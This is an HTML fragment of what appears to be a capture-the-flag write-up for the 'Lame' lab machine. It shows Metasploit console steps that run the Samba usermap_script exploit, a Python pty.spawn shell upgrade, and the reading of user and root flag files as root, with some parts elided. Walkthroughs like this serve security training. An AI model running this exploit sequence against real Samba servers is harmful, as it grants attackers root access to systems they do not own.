...
<font size="1">
<div style="height:400px;width:800px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p>msf > use <font color="BB69EC">exploit/multi/samba/usermap_script</font>
...
<br>msf exploit(<font color="red">usermap_script</font>) > <font color="BB69EC">exploit</font>
...
<font size="1">
<div style="height:400px;width:800px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="BB69EC">python -c 'import pty;pty.spawn("/bin/bash")'</font>
...
<br>ls
<br>user.txt
<br>root@lame:/home/makis# <font color="BB69EC">cat user.txt</font>
...
<br>root@lame:/root# <font color="BB69EC">cat root.txt</font></p>
</div>
</font>
